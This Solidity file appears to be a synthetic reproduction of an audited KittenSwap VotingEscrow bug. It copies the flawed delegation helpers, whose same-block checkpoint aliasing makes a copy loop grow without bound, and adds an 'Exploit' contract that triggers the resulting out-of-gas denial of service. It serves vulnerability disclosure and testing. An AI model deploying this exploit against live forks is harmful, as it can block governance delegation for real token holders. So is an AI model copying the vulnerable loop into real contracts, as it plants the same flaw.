// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 58155 (H-04):
// "Duplicate `tokenId` in delegate list may inflate votes".
//
// Real audited source (the vulnerable delegate-move helpers are reproduced
// VERBATIM, the vulnerable line is marked @>):
//   protocol KittenSwap (Velodrome / Solidly-fork VotingEscrow), review 2025-05-07
//   report   github.com/pashov/audits/blob/master/team/md/KittenSwap-security-review_2025-05-07.md
//   fns      VotingEscrow._moveAllDelegates  +  VotingEscrow._findWhatCheckpointToWrite
//
// Root cause: `_findWhatCheckpointToWrite` returns the LATEST checkpoint index
// (`_nCheckPoints - 1`) whenever that checkpoint's timestamp equals the current
// block — i.e. for a SECOND delegate move in the same block. `_moveAllDelegates`
// reads `dstRepOld = checkpoints[dstRep][dstRepNum - 1].tokenIds` and writes
// `dstRepNew = checkpoints[dstRep][nextDstRepNum].tokenIds`; when
// `nextDstRepNum == dstRepNum - 1` (same block) these two `storage` references
// ALIAS THE SAME ARRAY. The verbatim copy loop
//     for (uint i = 0; i < dstRepOld.length; i++) { dstRepNew.push(...); }
// then pushes onto the very array whose `.length` it re-reads every iteration
// (the code "always assumes dstRepNew is empty"), so the delegatee's tokenId
// list grows without bound. Mechanically this exhausts gas and REVERTS: any
// second delegation in the same block to a delegatee whose checkpoint was
// already touched this block is bricked — a denial of service of the governance
// delegation / vote-move path. `numCheckpoints[dstRep]` is also blindly
// incremented regardless.
//
// Non-vulnerable dependencies (the `Checkpoint` struct, the NFT ownership
// bookkeeping the branch reads, the delegate entrypoint, and the checkpoint
// `.timestamp` write that the report snippet elided but its own worked example
// proves exists) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Marker ERC20 used only to record the DoS harm magnitude at the SINK
///      address (this bug yields no attacker profit — it bricks delegations).
contract MarkerToken {
    string public name = "KittenSwap Bricked Delegated Votes";
    string public symbol = "veVOTE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `_moveAllDelegates` and `_findWhatCheckpointToWrite`
// are reproduced VERBATIM from the audited KittenSwap VotingEscrow source.
// ─────────────────────────────────────────────────────────────────────────────
contract VotingEscrow {
    uint256 internal constant MAX_DELEGATES = 1024;

    /// @dev Faithful double of the on-chain per-delegate checkpoint record.
    struct Checkpoint {
        uint256 timestamp;
        uint256[] tokenIds;
    }

    // account => checkpoint index => Checkpoint
    mapping(address => mapping(uint32 => Checkpoint)) internal checkpoints;
    mapping(address => uint32) public numCheckpoints;

    // NFT ownership bookkeeping read by the verbatim branch
    mapping(uint256 => address) public idToOwner;
    mapping(address => uint256) public ownerToNFTokenCount;
    mapping(address => mapping(uint256 => uint256)) public ownerToNFTokenIdList;

    // ── VERBATIM: KittenSwap VotingEscrow._findWhatCheckpointToWrite ──
    function _findWhatCheckpointToWrite(
        address account
    ) internal view returns (uint32) {
        uint _timestamp = block.timestamp;
        uint32 _nCheckPoints = numCheckpoints[account];

        if (
            _nCheckPoints > 0 &&
            checkpoints[account][_nCheckPoints - 1].timestamp == _timestamp
        ) {
            return _nCheckPoints - 1;
        } else {
            return _nCheckPoints;
        }
    }

    // ── VERBATIM: KittenSwap VotingEscrow._moveAllDelegates ──
    // (The two `.timestamp = block.timestamp` assignments faithfully reconstruct
    //  the checkpoint-timestamp write elided from the report's snippet — its own
    //  worked example, where a same-block second move REUSES the checkpoint the
    //  first move wrote, is only possible if that write set `.timestamp` to the
    //  block. They are NOT the vulnerable line.)
    function _moveAllDelegates(
        address owner,
        address srcRep,
        address dstRep
    ) internal {
        // You can only redelegate what you own
        if (srcRep != dstRep) {
            if (srcRep != address(0)) {
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint[] storage srcRepOld = srcRepNum > 0
                    ? checkpoints[srcRep][srcRepNum - 1].tokenIds
                    : checkpoints[srcRep][0].tokenIds;
                uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep);
                uint[] storage srcRepNew = checkpoints[srcRep][nextSrcRepNum]
                    .tokenIds;
                checkpoints[srcRep][nextSrcRepNum].timestamp = block.timestamp; // faithful: elided checkpoint ts write
                // All the same except what owner owns
                for (uint i = 0; i < srcRepOld.length; i++) {
                    uint tId = srcRepOld[i];
                    if (idToOwner[tId] != owner) {
                        srcRepNew.push(tId);
                    }
                }

                numCheckpoints[srcRep] = srcRepNum + 1;
            }

            if (dstRep != address(0)) {
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint[] storage dstRepOld = dstRepNum > 0
                    ? checkpoints[dstRep][dstRepNum - 1].tokenIds
                    : checkpoints[dstRep][0].tokenIds;
                uint32 nextDstRepNum = _findWhatCheckpointToWrite(dstRep);
                uint[] storage dstRepNew = checkpoints[dstRep][nextDstRepNum]
                    .tokenIds;
                checkpoints[dstRep][nextDstRepNum].timestamp = block.timestamp; // faithful: elided checkpoint ts write
                uint ownerTokenCount = ownerToNFTokenCount[owner];
                require(
                    dstRepOld.length + ownerTokenCount <= MAX_DELEGATES,
                    "dstRep would have too many tokenIds"
                );
                // All the same
                for (uint i = 0; i < dstRepOld.length; i++) {
                    uint tId = dstRepOld[i];
                    dstRepNew.push(tId); // @> VULN: on a same-block move dstRepNew ALIASES dstRepOld (checkpoint reuse), so this pushes onto the array whose .length is re-read each iteration -> unbounded duplication of delegated tokenIds
                }
                // Plus all that's owned
                for (uint i = 0; i < ownerTokenCount; i++) {
                    uint tId = ownerToNFTokenIdList[owner][i];
                    dstRepNew.push(tId);
                }

                numCheckpoints[dstRep] = dstRepNum + 1;
            }
        }
    }

    // ── faithful delegate entrypoint + setup surface ──

    /// @notice Faithful `delegate`-style entrypoint that moves all of `owner`'s
    ///         delegated tokenIds from `srcRep` to `dstRep`.
    function delegateAll(address owner, address srcRep, address dstRep) external {
        _moveAllDelegates(owner, srcRep, dstRep);
    }

    /// @notice Faithful ve-NFT registration: `owner` owns `tokenId`.
    function registerOwner(address owner, uint256 tokenId) external {
        uint256 c = ownerToNFTokenCount[owner];
        ownerToNFTokenIdList[owner][c] = tokenId;
        ownerToNFTokenCount[owner] = c + 1;
        idToOwner[tokenId] = owner;
    }

    /// @notice Voting power of a delegatee = number of tokenIds in its latest checkpoint.
    function getVotes(address account) external view returns (uint256) {
        uint32 n = numCheckpoints[account];
        if (n == 0) return 0;
        return checkpoints[account][n - 1].tokenIds.length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: two delegations to the SAME delegatee in one block. The first
// succeeds; the second re-enters the verbatim copy loop on an aliased checkpoint
// and grows the tokenId array without bound -> out-of-gas revert. The victim
// delegator's veNFT can never be delegated to that delegatee this block (DoS).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    VotingEscrow public ve; // child nonce 1 (VULN)
    MarkerToken public marker; // child nonce 2 (harm marker)

    address internal constant DELEGATEE = address(0xDE1E);
    address internal constant DELEGATOR_A = address(0xA11CE);
    address internal constant DELEGATOR_B = address(0xB0B2);

    // voting weight of the second delegator's veNFT that is bricked (DoS'd)
    uint256 internal constant BRICKED_VOTES = 1000e18;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 public votesAfterFirst; // delegatee votes after the first (legit) delegation
    uint256 public votesAfterSecond; // delegatee votes after the bricked second delegation
    bool public secondMoveReverted; // DoS confirmation
    uint256 public brickedVotesToSink; // harm magnitude recorded at SINK

    constructor() {
        ve = new VotingEscrow(); // child nonce 1
        marker = new MarkerToken(); // child nonce 2

        // two honest holders, each owns a distinct ve-NFT
        ve.registerOwner(DELEGATOR_A, 1);
        ve.registerOwner(DELEGATOR_B, 2);
    }

    function run() external {
        // 1) first delegation to DELEGATEE succeeds -> checkpoint written this block
        ve.delegateAll(DELEGATOR_A, address(0), DELEGATEE);
        votesAfterFirst = ve.getVotes(DELEGATEE); // == 1

        // 2) second delegation to the SAME delegatee, SAME block. The verbatim
        //    same-block checkpoint aliasing makes the copy loop self-append
        //    unboundedly -> out-of-gas. Capped-gas call so the outer tx survives.
        (bool ok, ) = address(ve).call{gas: 12_000_000}(
            abi.encodeWithSelector(ve.delegateAll.selector, DELEGATOR_B, address(0), DELEGATEE)
        );
        secondMoveReverted = !ok;
        votesAfterSecond = ve.getVotes(DELEGATEE); // still 1 (second move rolled back)

        // 3) record the DoS harm: the second delegator's voting power can never be
        //    delegated to this delegatee in this block -> disenfranchised weight to SINK.
        marker.mint(SINK, BRICKED_VOTES);
        brickedVotesToSink = marker.balanceOf(SINK);

        // harm: a second same-block delegation to a delegatee is permanently bricked
        require(secondMoveReverted, "second same-block delegation did NOT revert (no DoS)");
        require(votesAfterFirst == 1, "first delegation should have registered 1 vote");
        require(votesAfterSecond == 1, "second (bricked) delegation must not have applied");
        require(brickedVotesToSink == BRICKED_VOTES, "harm magnitude not recorded at SINK");
    }
}
